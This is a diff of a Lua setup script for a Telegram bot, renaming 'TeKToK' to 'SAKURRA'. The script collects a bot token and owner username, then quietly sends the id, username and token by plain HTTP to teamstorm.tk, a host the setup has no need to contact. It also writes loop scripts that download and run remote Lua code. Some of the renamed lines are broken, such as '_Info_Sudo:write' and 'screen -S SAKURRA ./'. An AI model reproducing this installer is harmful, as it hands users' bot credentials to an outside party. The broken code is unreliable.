@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_TeKToK = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_TeKToK = function() 
+Server_SAKURRA = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_SAKURRA = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local TeKToK_Info_Sudo = io.open("sudo.lua", 'w')
-TeKToK_Info_Sudo:write([[
+local SAKURRA_Info_Sudo = io.open("sudo.lua", 'w')
+_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-TeKToK_Info_Sudo:close()
+SAKURRA_Info_Sudo:close()
 end  
-if not database:get(Server_TeKToK.."Token_TeKToK") then
+if not database:get(Server_SAKURRA.."Token_SAKURRA") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_TeKToK.."Token_TeKToK",token)
+database:set(Server_SAKURRA.."Token_SAKURRA",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua run.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_TeKToK.."UserName_TeKToK") then
+if not database:get(Server_SAKURRA.."UserName_SAKURRA") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua run.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_TeKToK.."UserName_TeKToK",Json.Info.Username)
-database:set(Server_TeKToK.."Id_TeKToK",Json.Info.Id)
+database:set(Server_SAKURRA.."UserName_SAKURRA",Json.Info.Username)
+database:set(Server_SAKURRA.."Id_SAKURRA",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua run.lua')
 end
-local function Files_TeKToK_Info()
-Create_Info(database:get(Server_TeKToK.."Token_TeKToK"),database:get(Server_TeKToK.."Id_TeKToK"),database:get(Server_TeKToK.."UserName_TeKToK"))   
-http.request("http://teamstorm.tk/insert/?id="..database:get(Server_TeKToK.."Id_TeKToK").."&user="..database:get(Server_TeKToK.."UserName_TeKToK").."&token="..database:get(Server_TeKToK.."Token_TeKToK"))
-local RunTeKToK = io.open("TeKToK", 'w')
-RunTeKToK:write([[
+local function Files_SAKURRA_Info()
+Create_Info(database:get(Server_SAKURRA.."Token_SAKURRA"),database:get(Server_SAKURRA.."Id_SAKURRA"),database:get(Server_SAKURRA.."UserName_SAKURRA"))   
+http.request("http://teamstorm.tk/insert/?id="..database:get(Server_SAKURRA.."Id_SAKURRA").."&user="..database:get(Server_SAKURRA.."UserName_SAKURRA").."&token="..database:get(Server_SAKURRA.."Token_SAKURRA"))
+local RunSAKURRA = io.open("SAKURRA", 'w')
+RunSAKURRA:write([[
 #!/usr/bin/env bash
-cd $HOME/TeKToK
-token="]]..database:get(Server_TeKToK.."Token_TeKToK")..[["
-rm -fr TeKToK.lua
-wget "https://raw.githubusercontent.com/TeKToKBot/TeKToK/master/TeKToK.lua"
+cd $HOME/SAKURRA
+token="]]..database:get(Server_SAKURRA.."Token_SAKURRA")..[["
+rm -fr SAKURRA.lua
+wget "https://raw.githubusercontent.com/SAKURAbott/SAKURRA/master/SAKURRA.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./TeKToK.lua -p PROFILE --bot=$token
+./tg -s ./SAKURRA.lua -p PROFILE --bot=$token
 done
 ]])
-RunTeKToK:close()
-local RunTs = io.open("tk", 'w')
+RunSAKURRA:close()
+local RunTs = io.open("sa", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/TeKToK
+cd $HOME/SAKURRA
 while(true) do
 rm -fr ../.telegram-cli
-screen -S TeKToK -X kill
-screen -S TeKToK ./TeKToK
+screen -S SAKURRA -X kill
+screen -S SAKURRA ./
 done
 ]])
 RunTs:close()
 end
-Files_TeKToK_Info()
-database:del(Server_TeKToK.."Token_TeKToK");database:del(Server_TeKToK.."Id_TeKToK");database:del(Server_TeKToK.."UserName_TeKToK")
+Files_SAKURRA_Info()
+database:del(Server_SAKURRA.."Token_SAKURRA");database:del(Server_SAKURRA.."Id_SAKURRA");database:del(Server_SAKURRA.."UserName_SAKURRA")
 sudos = dofile('sudo.lua')
 os.execute('./ins.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_TeKToK()  
+AutoFiles_SAKURRA()  
 var = true
 else   
 f:close()  
-database:del(Server_TeKToK.."Token_TeKToK");database:del(Server_TeKToK.."Id_TeKToK");database:del(Server_TeKToK.."UserName_TeKToK")
+database:del(Server_SAKURRA.."Token_SAKURRA");database:del(Server_SAKURRA.."Id_SAKURRA");database:del(Server_SAKURRA.."UserName_SAKURRA")
 sudos = dofile('sudo.lua')
 os.execute('./ins.sh ins')
 var = false
